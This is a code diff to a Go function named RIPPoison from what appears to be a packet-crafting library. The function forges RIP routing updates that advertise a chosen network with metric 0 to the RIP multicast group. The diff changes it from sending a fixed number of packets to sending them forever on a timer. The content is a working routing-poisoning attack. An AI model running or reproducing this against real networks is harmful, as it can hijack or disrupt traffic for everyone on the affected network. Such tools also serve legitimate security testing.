@@ -5,9 +5,10 @@ import (
 	communication "github.com/tiagomdiogo/ScaGo/supersocket"
 	"github.com/tiagomdiogo/ScaGo/utils"
 	"net"
+	"time"
 )
 
-func RIPPoison(network, subnet_mask, iface string, numberPackets int) {
+func RIPPoison(network, subnet_mask, iface string, interval int) {
 	ipLayer := packet.IPv4Layer()
 	ipLayer.SetSrcIP(utils.IPbyInt(iface))
 	ipLayer.SetDstIP("224.0.0.9")
@@ -22,7 +23,13 @@ func RIPPoison(network, subnet_mask, iface string, numberPackets int) {
 	ripLayer.AddEntry(2, 0, net.ParseIP(network), net.ParseIP(subnet_mask), net.ParseIP("0.0.0.0"), 0)
 
 	pkt, _ := packet.CraftPacket(ipLayer.Layer(), udpLayer.Layer(), ripLayer.Layer())
-	for i := 0; i < numberPackets; i++ {
-		communication.Send(pkt, iface)
+
+	ticker := time.NewTicker(time.Duration(interval) * time.Second)
+	defer ticker.Stop()
+	for {
+		select {
+		case <-ticker.C:
+			communication.Send(pkt, iface)
+		}
 	}
 }
